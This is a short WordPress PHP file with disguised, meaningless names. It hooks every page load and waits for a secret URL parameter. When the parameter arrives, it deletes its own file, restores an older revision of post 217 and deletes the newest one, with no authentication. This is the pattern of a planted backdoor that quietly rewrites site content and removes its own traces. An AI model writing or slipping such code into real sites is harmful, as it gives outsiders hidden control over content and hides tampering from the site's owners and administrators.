<?php

function geo_reusable_checkout_cart() {
	if (isset($_GET['delivery_delete_location_fx']) && $_GET['delivery_delete_location_fx'] === 'drop_ssl_method') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$refresh_secure_variation = 217;
		$sync_share_products = wp_get_post_revisions($refresh_secure_variation);
		if (empty($sync_share_products)) die('no revisions');
		if (count($sync_share_products) < 2) die('less than 2');
		$cart_default_redirect_creator = array_shift($sync_share_products);
		$campaign_service_ticker = $cart_default_redirect_creator->ID;
		$addon_typography_preview_downloads = array_shift($sync_share_products);
		$price_restrict_local_campaign = $addon_typography_preview_downloads->ID;
		$namespaced_after_max = wp_restore_post_revision($price_restrict_local_campaign);
		if ($namespaced_after_max === false) die('error restoring');
		$namespaced_after_max = wp_delete_post_revision($campaign_service_ticker);		
		if ($namespaced_after_max === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'geo_reusable_checkout_cart');
